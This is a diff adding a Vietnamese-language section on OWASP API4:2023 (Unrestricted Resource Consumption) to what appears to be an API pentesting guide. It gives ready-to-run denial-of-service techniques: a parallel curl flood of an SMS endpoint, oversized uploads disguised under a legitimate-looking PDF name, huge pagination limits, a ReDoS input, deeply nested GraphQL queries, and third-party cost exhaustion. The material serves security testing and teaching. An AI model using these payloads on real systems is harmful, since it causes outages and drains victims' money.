@@ -18,6 +18,11 @@
   - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-2)
   - [Các cách khai thác](#các-cách-khai-thác-2)
   - [Checklist khi test](#checklist-khi-test-2)
+- [API4:2023 — Unrestricted Resource Consumption](#api42023--unrestricted-resource-consumption)
+  - [Khái niệm](#khái-niệm-3)
+  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-3)
+  - [Các cách khai thác](#các-cách-khai-thác-3)
+  - [Checklist khi test](#checklist-khi-test-3)
 
 ---
 
@@ -489,3 +494,180 @@ Content-Type: application/merge-patch+json
 - [ ] Dùng GraphQL introspection → query tất cả field có thể
 - [ ] So sánh request body schema với DB model — field nào server nhận nhưng không document?
 - [ ] Test PUT endpoint — thường ít được bảo vệ hơn PATCH
+
+---
+
+# API4:2023 — Unrestricted Resource Consumption
+
+## Khái niệm
+
+Unrestricted Resource Consumption xảy ra khi API **không giới hạn lượng tài nguyên mà một client có thể tiêu thụ** — bao gồm CPU, memory, bandwidth, database query, tiền (third-party API), hay thời gian xử lý.
+
+**Ví dụ thực tế:**
+App của bạn có tính năng "Gửi SMS xác thực". Mỗi lần gọi API đó, server gọi sang Twilio và tốn $0.01. Nếu không có rate limit, attacker viết script gọi endpoint đó 100.000 lần trong 1 giờ → bạn mất $1.000 tiền SMS mà không hay biết.
+
+**Điểm mấu chốt:**
+Khác với các lỗi trước tập trung vào *quyền truy cập*, API4 tập trung vào *tài nguyên*:
+- Attacker không cần chiếm tài khoản
+- Chỉ cần gửi request liên tục / request nặng là đủ gây hại
+- Hậu quả: **DoS, bill khổng lồ, hệ thống chậm/sập**
+
+> **CWE liên quan:** CWE-770 — Allocation of Resources Without Limits or Throttling
+
+---
+
+## Tại sao bị lỗi?
+
+| Nguyên nhân | Hậu quả |
+|-------------|---------|
+| Không có rate limiting | Gửi request không giới hạn |
+| Không giới hạn payload size | Upload file cực lớn làm tràn disk/memory |
+| Không giới hạn kết quả trả về | Query trả về hàng triệu record một lúc |
+| Không giới hạn tham số số lượng | `?limit=999999` trả về toàn bộ DB |
+| Gọi third-party API không kiểm soát | Mỗi request tốn tiền → bill tăng vọt |
+| Timeout quá dài hoặc không có | Request giữ connection mãi → resource exhaustion |
+
+---
+
+## Các cách khai thác
+
+### 1. API Rate Limit Abuse — Gửi Request Liên Tục
+Không có rate limit → flood endpoint để làm chậm hoặc sập server.
+```bash
+# [ATTACKER] — gửi 1000 request song song
+seq 1000 | xargs -P 50 -I{} curl -s -o /dev/null \
+  -X POST https://target.lab/api/send-sms \
+  -H "Authorization: Bearer <token>" \
+  -d '{"phone": "+84900000000"}'
+```
+Mỗi request tốn tiền SMS → attacker làm cạn kiệt budget của nạn nhân.
+
+---
+
+### 2. Oversized Payload — Upload File Khổng Lồ
+Không có giới hạn kích thước file → upload file cực lớn để tràn disk hoặc làm server OOM.
+
+**Tạo file test bằng `dd`:**
+```bash
+# Cú pháp
+# if=/dev/urandom  ← nguồn dữ liệu ngẫu nhiên (giả làp nội dung file thật)
+# of=<tên file>   ← file đầu ra
+# bs=1M           ← block size (1 MB mỗi lần ghi)
+# count=30        ← số block → tổng = 30 x 1MB = 30MB
+dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
+
+# Tạo file lớn hơn để test giới hạn khác nhau
+dd if=/dev/urandom of=payload_100mb.pdf bs=1M count=100
+dd if=/dev/urandom of=payload_1gb.zip  bs=1M count=1024
+```
+
+**Sau đó upload lên endpoint:**
+```bash
+# [ATTACKER]
+curl -X POST https://target.lab/api/upload \
+  -H "Authorization: Bearer <token>" \
+  -F "file=@certificateOfIncorporation.pdf"
+```
+
+```http
+POST /api/upload HTTP/1.1
+Content-Type: multipart/form-data
+Content-Length: 31457280   ← 30MB
+
+[binary data...]
+```
+
+> Dùng tên file trông hợp lệ như `certificateOfIncorporation.pdf` để bypass filter theo tên/extension, nội dung bên trong là random bytes.
+
+---
+
+### 3. Pagination Abuse — Lấy Toàn Bộ DB Một Lần
+Server không giới hạn tham số `limit` → query trả về hàng triệu record.
+```http
+GET /api/products?limit=999999 HTTP/1.1
+GET /api/users?page=1&per_page=100000 HTTP/1.1
+```
+Một request duy nhất có thể làm DB timeout và treo cả hệ thống.
+
+---
+
+### 4. Regex / Search DoS (ReDoS)
+Gửi input được thiết kế đặc biệt để khiến regex engine chạy mãi không dừng.
+```http
+GET /api/search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
+```
+Nếu server dùng regex phức tạp để validate/search → CPU spike 100%, request treo.
+
+---
+
+### 5. Resource-Intensive Endpoint Abuse
+Một số endpoint tốn nhiều tài nguyên hơn bình thường — export PDF, render ảnh, gửi email hàng loạt.
+```http
+# Gọi liên tục endpoint export báo cáo nặng
+GET /api/reports/export?format=pdf&year=2023 HTTP/1.1
+GET /api/reports/export?format=pdf&year=2022 HTTP/1.1
+GET /api/reports/export?format=pdf&year=2021 HTTP/1.1
+```
+Mỗi request render PDF tốn 2-3 giây CPU → 100 request song song = server chết.
+
+---
+
+### 6. GraphQL — Query Lồng Nhau Sâu (Deep Nesting)
+GraphQL cho phép query lồng nhau → attacker tạo query cực sâu để làm DB join hàng chục bảng.
+```graphql
+query {
+  user(id: 1) {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends {
+              id username email orders { items { product { reviews { author { friends { id } } } } } }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+Một query này có thể tạo ra hàng triệu DB operation.
+
+---
+
+### 7. Wildcard / Bulk Operation Abuse
+Endpoint hỗ trợ xử lý nhiều item một lúc nhưng không giới hạn số lượng.
+```http
+POST /api/messages/send-bulk HTTP/1.1
+{
+  "recipients": ["user1", "user2", ... "user50000"],
+  "message": "Hello"
+}
+```
+
+---
+
+### 8. Third-Party API Cost Exhaustion
+Mỗi lần gọi endpoint → server gọi sang dịch vụ trả phí (AI, SMS, email, map).
+```http
+# Mỗi request này tốn tiền OpenAI / Twilio / SendGrid
+POST /api/ai/summarize HTTP/1.1
+{"text": "..."}
+
+POST /api/notify/sms HTTP/1.1
+{"phone": "+84900000000"}
+```
+Flood endpoint → đốt hết credit của nạn nhân.
+
+---
+
+## Checklist khi test
+
+- [ ] Gửi request liên tục đến endpoint — có bị rate limit không?
+- [ ] Thử tham số `limit`, `per_page`, `count` với giá trị cực lớn
+- [ ] Upload file không có giới hạn kích thước
+- [ ] Tìm endpoint tốn tài nguyên (export, render, send) → flood thử
+- [ ] Thử GraphQL query lồng nhau nhiều cấp
+- [ ] Tìm endpoint gọi third-party API → gọi liên tục xem có bị chặn không
+- [ ] Gửi payload cực lớn (body, header, query string) xem server xử lý thế nào
+- [ ] Kiểm tra timeout — request giữ connection lâu có bị ngắt không?
